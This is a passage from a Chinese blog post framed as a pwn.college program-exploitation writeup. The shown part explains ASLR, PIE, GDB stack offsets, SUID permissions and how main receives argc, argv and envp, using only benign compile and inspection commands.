<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="PWN-College-Program-Exploitation-Writeup, 老叭美食家">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>PWN-College-Program-Exploitation-Writeup | 老叭美食家</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="老叭美食家" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/static/image/header/home.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">老叭美食家</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>联系</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">老叭美食家</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			联系
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">PWN-College-Program-Exploitation-Writeup</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tag/%E9%80%86%E5%90%91/">
                                <span class="chip bg-color">逆向</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/category/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-08-13
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-04-30
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    11.8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    57 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="pwn-college-Program-Exploitation"><a href="#pwn-college-Program-Exploitation" class="headerlink" title="pwn.college Program-Exploitation"></a>pwn.college Program-Exploitation</h1><p><a target="_blank" rel="noopener" href="https://pwn.college/program-security/program-exploitation/">https://pwn.college/program-security/program-exploitation/</a></p>
<h2 id="值得学习的"><a href="#值得学习的" class="headerlink" title="值得学习的"></a>值得学习的</h2><h3 id="1-在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？"><a href="#1-在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？" class="headerlink" title="1. 在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？"></a>1. 在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？</h3><p>在二进制程序不开启地址空间布局随机化（ASLR, Address Space Layout Randomization）的情况下，操作系统可以通过以下机制保证二进制程序每次都在相同的地址加载：</p>
<ol>
<li>固定的加载基地址<br>在编译程序时，链接器会将二进制程序的各个部分（如代码段、数据段、堆栈等）指定一个默认的加载地址，这被称为基地址。当 ASLR 未启用时，操作系统会按照这个默认的基地址将程序加载到内存中。<br>由于没有开启地址随机化，每次执行这个程序时，它的代码段、数据段等都会加载到同样的内存地址。</li>
<li>操作系统加载器的行为<br>操作系统的加载器在加载可执行文件时，会检查是否开启了 ASLR。如果未开启，加载器会遵循可执行文件的默认基地址，并按照程序的地址映射表（通常是可执行文件中的程序头表或段表）将程序的各个部分加载到指定的固定地址。<br>在这种情况下，程序的每次加载地址都是固定的，这意味着所有函数、变量的内存地址在每次程序执行时都是一致的。</li>
<li>编译时的控制<br>在编译可执行文件时，开发者或编译器可以通过指定编译选项来关闭 ASLR。例如，在 GCC 编译器中，可以使用 -no-pie 选项生成一个不支持位置无关代码的可执行文件，这样该文件会有一个固定的基地址，而不会在每次加载时随机化。</li>
<li>静态链接 vs 动态链接<br>静态链接：在静态链接的程序中，所有库函数代码都被嵌入到可执行文件中，因此整个程序在内存中的布局是确定的，不依赖于动态链接库的加载地址。<br>动态链接：在动态链接的程序中，虽然主程序的加载地址是固定的，但动态链接库的加载地址可能会发生变化。如果 ASLR 未开启，动态库也会被加载到固定的地址。<br><strong>总结：</strong><br>当 ASLR 未开启时，操作系统通过遵循可执行文件中的默认加载地址和程序的内存布局来保证二进制程序每次都在相同的内存地址加载。这种固定加载地址的行为使得程序的各个部分在内存中的位置是确定的，但也因此增加了程序易受攻击的风险（例如基于内存地址的攻击）。这就是为什么现代操作系统通常会默认开启 ASLR 以提高程序的安全性。</li>
</ol>
<p>如果有两个程序都没有开启 ASLR，它们的加载地址不一定会相同，具体取决于几个因素：</p>
<ol>
<li>程序的默认基地址<br>每个可执行文件在编译时，链接器通常会为其指定一个默认的基地址。如果两个程序的默认基地址相同，并且没有其他干扰因素，它们在没有开启 ASLR 的情况下可能会加载到相同的内存地址。<br>但是，如果两个程序的默认基地址不同，即使没有开启 ASLR，它们也会被加载到不同的地址。</li>
<li>内存映射<br>即使两个程序具有相同的默认基地址，操作系统在加载时还需要考虑系统的内存使用情况。如果第一个程序已经占用了某些内存区域，操作系统可能会选择将第二个程序加载到不同的内存地址以避免冲突。<br>例如，如果第一个程序使用了某些共享库或内存映射文件，可能会占用一定的地址空间，导致第二个程序无法加载到完全相同的地址。</li>
<li>进程隔离<br>现代操作系统使用虚拟内存来实现进程隔离，即每个进程在其虚拟地址空间内运行，彼此独立。因此，虽然两个程序的加载地址在它们各自的虚拟地址空间中可以是相同的，但它们在实际的物理内存中并不共享相同的内存区域。<br>从每个程序的视角来看，它们可能看到相同的加载地址，但由于虚拟内存机制，这些地址映射到不同的物理内存位置。</li>
<li>动态链接库<br>如果两个程序使用相同的动态链接库，并且这些库没有开启 ASLR，它们的加载地址可能会在不同进程中一致。这会导致某些地址相同，但并不一定是整个程序都在相同的地址。<br><strong>结论：</strong><br>两个没有开启 ASLR 的程序不一定会加载到相同的地址，即使它们的默认基地址相同。加载地址的实际分配还受内存布局、系统资源使用情况以及操作系统的内存管理策略的影响。虚拟内存机制确保了每个程序有独立的虚拟地址空间，这意味着即使加载地址相同，它们在实际物理内存中的位置是不同的。</li>
</ol>
<h3 id="2-GDB-和-程序运行时的栈基址差异"><a href="#2-GDB-和-程序运行时的栈基址差异" class="headerlink" title="2. GDB 和 程序运行时的栈基址差异"></a>2. GDB 和 程序运行时的栈基址差异</h3><p><strong>GDB 中的栈基址</strong></p>
<ul>
<li>调试器的影响：当使用 GDB 调试程序时，GDB 插入了一些额外的调试信息和栈帧。这可能会影响栈的起始地址和布局。例如，GDB 可能会使用额外的栈帧来保存调试信息，或者在程序的栈中插入调试断点。</li>
<li>栈的显示：GDB 可能会显示调试器视图下的栈基址，这可能与程序在正常运行时的栈基址不同。</li>
</ul>
<p><strong>程序运行时的栈基址</strong></p>
<ul>
<li>运行时环境：在程序正常运行时，栈的基址由操作系统分配，并且可能受到各种因素的影响，包括操作系统的内存管理和地址空间布局（例如 ASLR）。</li>
<li>栈布局：程序在实际运行时，其栈的起始位置是由操作系统分配的，通常与调试时的环境不同。</li>
</ul>
<h3 id="3-PIE-和ASLR的关系？"><a href="#3-PIE-和ASLR的关系？" class="headerlink" title="3. PIE 和ASLR的关系？"></a>3. PIE 和ASLR的关系？</h3><p>PIE（Position-Independent Executable）模式是现代操作系统中用来增强程序安全性的一种机制。它使得生成的可执行文件在内存中加载时可以被放置在不同的内存地址，从而减少某些类型攻击（例如缓冲区溢出）的成功率。</p>
<h4 id="1-PIE-的作用"><a href="#1-PIE-的作用" class="headerlink" title="1. PIE 的作用"></a>1. <strong>PIE 的作用</strong></h4><p>PIE 是一种让可执行文件具备位置无关特性的机制。传统上，可执行文件在内存中总是加载到固定的地址，而 PIE 可执行文件则可以加载到内存中的任意地址，这一特性使得它更难成为攻击目标。</p>
<h4 id="2-PIE-的实现原理"><a href="#2-PIE-的实现原理" class="headerlink" title="2. PIE 的实现原理"></a>2. <strong>PIE 的实现原理</strong></h4><p>PIE 模式结合了以下技术：</p>
<ul>
<li><strong>位置无关代码（Position-Independent Code, PIC）</strong>：PIE 可执行文件的代码是位置无关的，这意味着它不依赖于固定的内存地址，可以在任意地址运行。通过使用相对地址和偏移量，代码的执行不依赖于绝对地址。</li>
<li><strong>动态链接</strong>：PIE 可执行文件通常是动态链接的，它们在运行时被链接器加载到内存中，而不是在编译时决定其内存位置。</li>
<li><strong>ASLR（地址空间布局随机化）</strong>：PIE 模式通常与 ASLR 配合使用，操作系统会在每次加载 PIE 可执行文件时，为其分配一个不同的加载地址。这使得攻击者无法预测程序的内存布局，增加了攻击难度。</li>
</ul>
<h4 id="3-PIE-的优点"><a href="#3-PIE-的优点" class="headerlink" title="3. PIE 的优点"></a>3. <strong>PIE 的优点</strong></h4><ul>
<li><strong>增强安全性</strong>：PIE 结合 ASLR 增加了攻击者的难度，因为每次执行时内存地址可能不同，减少了基于固定地址的漏洞利用可能性。</li>
<li><strong>灵活性</strong>：PIE 可执行文件可以在任何内存地址加载，这对多进程或多线程的程序尤其有利，因为它们可以共享代码段但使用不同的内存布局。</li>
</ul>
<h4 id="4-如何生成-PIE-可执行文件"><a href="#4-如何生成-PIE-可执行文件" class="headerlink" title="4. 如何生成 PIE 可执行文件"></a>4. <strong>如何生成 PIE 可执行文件</strong></h4><p>在编译程序时，可以通过特定的编译器选项生成 PIE 可执行文件。以 GCC 为例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-fPIE</span> <span class="token parameter variable">-pie</span> <span class="token parameter variable">-o</span> your_program your_program.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>**<code>-fPIE</code>**：告诉编译器生成位置无关的代码。</li>
<li>**<code>-pie</code>**：告诉链接器生成一个位置无关的可执行文件。</li>
</ul>
<h4 id="5-如何检查程序是否是-PIE"><a href="#5-如何检查程序是否是-PIE" class="headerlink" title="5. 如何检查程序是否是 PIE"></a>5. <strong>如何检查程序是否是 PIE</strong></h4><p>你可以使用 <code>readelf</code> 或 <code>objdump</code> 来检查一个可执行文件是否是 PIE。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">readelf <span class="token parameter variable">-h</span> your_program <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'Type:'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>如果显示 <code>DYN</code>，则说明该可执行文件是一个 PIE 文件。</li>
<li>如果显示 <code>EXEC</code>，则说明该可执行文件不是 PIE 文件。</li>
</ul>
<p>或者使用 <code>objdump</code>：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-f</span> your_program <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'file format'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="6-PIE-与-ASLR-的关系"><a href="#6-PIE-与-ASLR-的关系" class="headerlink" title="6. PIE 与 ASLR 的关系"></a>6. <strong>PIE 与 ASLR 的关系</strong></h4><ul>
<li><strong>ASLR（地址空间布局随机化）</strong>：ASLR 是一种安全技术，用于随机化程序在内存中的地址空间，包括栈、堆、共享库等。PIE 可执行文件配合 ASLR 可以实现更加有效的随机化，因为整个可执行文件的加载地址也会被随机化。</li>
<li><strong>PIE 的重要性</strong>：在支持 ASLR 的系统中，如果可执行文件是 PIE 类型，那么其加载地址也会被随机化。如果不是 PIE 类型，则 ASLR 对其作用有限，通常只能随机化栈、堆等部分内存区域，而代码段的加载地址仍然是固定的。</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li><strong>PIE（Position-Independent Executable）</strong> 是一种生成位置无关可执行文件的技术，增强了程序的安全性。</li>
<li><strong>PIE</strong> 使得可执行文件可以在内存中的任意位置加载，通常与 <strong>ASLR</strong> 结合使用，防止基于固定地址的攻击。</li>
<li>生成 PIE 可执行文件需要使用编译器和链接器的特定选项，可以通过工具检查文件是否为 PIE。</li>
</ul>
<h3 id="4-SUID"><a href="#4-SUID" class="headerlink" title="4. SUID"></a>4. SUID</h3><p>SUID（Set User ID）是一种文件权限设置，用于在执行文件时临时提升用户权限。在 UNIX 和 Linux 系统中，SUID 位的作用是让执行该文件的用户以文件所有者的身份运行程序，而不是以执行者自身的身份运行。</p>
<h4 id="SUID-的详细解释"><a href="#SUID-的详细解释" class="headerlink" title="SUID 的详细解释"></a>SUID 的详细解释</h4><p>SUID 位：在文件权限的三组权限位中（所有者、组、其他人），SUID 位在所有者权限组中的执行权限位（第三位）设置。它的符号表示为小写的 s 或大写的 S：</p>
<ul>
<li>s：表示文件的所有者具有执行权限，并且设置了 SUID 位。</li>
<li>S：表示文件的所有者没有执行权限，但设置了 SUID 位（这种情况较少见，因为没有执行权限的 SUID 位通常是无意义的）。</li>
</ul>
<p>工作原理：当一个用户执行带有 SUID 位的可执行文件时，操作系统会将该用户的权限临时提升为文件所有者的权限。通常，这意味着一个普通用户执行一个 SUID 程序时，该程序将以 root 用户的权限运行。</p>
<p>假设有一个程序 example，其文件权限如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">12345</span> Aug <span class="token number">24</span> <span class="token number">2024</span> /path/to/example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>rws：表示文件所有者 root 对文件有读、写、执行权限，并且设置了 SUID 位。</li>
<li>r-x：表示文件所属组对文件有读和执行权限。</li>
<li>r-x：表示其他用户对文件有读和执行权限。</li>
</ul>
<p>在这种情况下，当普通用户（如 user）执行 /path/to/example 时，操作系统会让该程序以 root 的权限运行，而不是 user 的权限。</p>
<h4 id="设置-SUID-位"><a href="#设置-SUID-位" class="headerlink" title="设置 SUID 位"></a>设置 SUID 位</h4><p>SUID 位对应的八进制值是 4，它会作为一个额外的位加在标准的三位八进制权限前面。</p>
<p>例如：</p>
<p>4755: 表示文件的权限是 rwsr-xr-x。具体的分解如下：<br>第一位 4：表示 SUID 位被设置。<br>第二位 7：表示文件所有者有读、写、执行权限 (rwx)。<br>第三位 5：表示文件所属组有读、执行权限 (r-x)。<br>第四位 5：表示其他用户有读、执行权限 (r-x)。</p>
<h3 id="5-int-cdecl-main-int-argc-const-char-argv-const-char-envp-main这些参数是如何传递的"><a href="#5-int-cdecl-main-int-argc-const-char-argv-const-char-envp-main这些参数是如何传递的" class="headerlink" title="5. int __cdecl main(int argc, const char **argv, const char **envp) main这些参数是如何传递的"></a>5. int __cdecl main(int argc, const char **argv, const char **envp) main这些参数是如何传递的</h3><p>在 C/C++ 程序中，<code>main()</code> 函数的参数 <code>argc</code>、<code>argv</code> 和 <code>envp</code> 是由操作系统传递给程序的。它们分别表示命令行参数的数量、命令行参数的数组，以及环境变量的数组。以下是它们是如何传递的详细过程：</p>
<h4 id="1-启动进程"><a href="#1-启动进程" class="headerlink" title="1. 启动进程"></a>1. <strong>启动进程</strong></h4><p>当你在命令行中启动一个程序时（例如 <code>./myprogram arg1 arg2</code>），操作系统会创建一个新的进程，并将程序的可执行文件加载到该进程的内存空间。</p>
<h4 id="2-设置堆栈"><a href="#2-设置堆栈" class="headerlink" title="2. 设置堆栈"></a>2. <strong>设置堆栈</strong></h4><p>在加载程序时，操作系统会为该进程设置一个初始堆栈。堆栈是一个数据结构，用于存储函数调用的局部变量、返回地址、以及函数的参数。</p>
<h4 id="3-传递命令行参数-argc-和-argv"><a href="#3-传递命令行参数-argc-和-argv" class="headerlink" title="3. 传递命令行参数 (argc 和 argv)"></a>3. <strong>传递命令行参数 (<code>argc</code> 和 <code>argv</code>)</strong></h4><ul>
<li><strong><code>argv</code> 数组</strong>: 操作系统会将命令行参数存储在堆栈上。具体来说，它会将每个参数的字符串存储在堆栈中的某个位置，并在 <code>argv</code> 数组中存储指向这些字符串的指针。<code>argv[0]</code> 通常是程序的名称或路径，<code>argv[1]</code> 到 <code>argv[argc-1]</code> 是传递给程序的其他参数。<code>argv[argc]</code> 为 <code>NULL</code>，表示数组的结束。</li>
<li><strong><code>argc</code> 参数</strong>: 操作系统还会将命令行参数的数量，即 <code>argc</code>，作为一个整数值存储在堆栈上。</li>
</ul>
<h4 id="4-传递环境变量-envp"><a href="#4-传递环境变量-envp" class="headerlink" title="4. 传递环境变量 (envp)"></a>4. <strong>传递环境变量 (<code>envp</code>)</strong></h4><ul>
<li><strong><code>envp</code> 数组</strong>: 环境变量是以字符串形式传递的，格式为 <code>key=value</code>。操作系统会将所有的环境变量存储在堆栈上，并创建一个 <code>envp</code> 数组，其中每个元素都是一个指向这些字符串的指针。<code>envp</code> 数组的最后一个元素是 <code>NULL</code>，表示数组结束。</li>
</ul>
<h4 id="5-堆栈布局"><a href="#5-堆栈布局" class="headerlink" title="5. 堆栈布局"></a>5. <strong>堆栈布局</strong></h4><p>在实际传递给 <code>main()</code> 函数之前，堆栈的布局通常如下所示（从高地址到低地址）：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">envp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"HOME=/home/user"</span>
envp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"PATH=/usr/bin"</span>
<span class="token punctuation">..</span>.
envp<span class="token punctuation">[</span>n<span class="token punctuation">]</span> -<span class="token operator">></span> NULL               <span class="token punctuation">;</span> 环境变量数组的结束标志

argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"./myprogram"</span>
argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"arg1"</span>
argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"arg2"</span>
<span class="token punctuation">..</span>.
argv<span class="token punctuation">[</span>argc<span class="token punctuation">]</span> -<span class="token operator">></span> NULL            <span class="token punctuation">;</span> 参数数组的结束标志

argc <span class="token operator">=</span> <span class="token number">3</span>                      <span class="token punctuation">;</span> 参数数量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="6-传递到-main"><a href="#6-传递到-main" class="headerlink" title="6. 传递到 main()"></a>6. <strong>传递到 <code>main()</code></strong></h4><p>在准备好堆栈后，操作系统会将控制权交给程序的入口点，即 <code>_start</code> 函数。<code>_start</code> 函数是程序的实际入口点，它负责初始化运行时环境，然后调用 <code>main()</code> 函数。</p>
